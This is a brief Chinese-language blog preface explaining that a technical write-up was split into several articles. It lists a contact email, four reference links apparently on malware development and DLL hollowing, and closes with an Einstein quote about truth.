原本想把所有技術都放在同一篇文章裡面一起寫完，不過寫到摘要時發現內容量會太多，所以就分成好幾篇文章好了。


若文中有錯誤或需要討論的地方，歡迎聯絡 `admin@dinlon5566.com`。

---
# 參考資料

1. https://github.com/cocomelonc/mdmz_book
2. https://samples.vx-underground.org/Microblog/2024-07-03%20-%20Small%20tidbits%20of%20malware%20dev%20knowledge.html
3. https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide
4. https://www.codereversing.com/archives/652

---
The right to search for truth implies also a duty; one must not conceal any part of what one has recognized to be true.  
尋求真理的權利亦暗示著一份責任；  我們絕不應該隱藏任何已認定為真實的部分。  
— Albert Einstein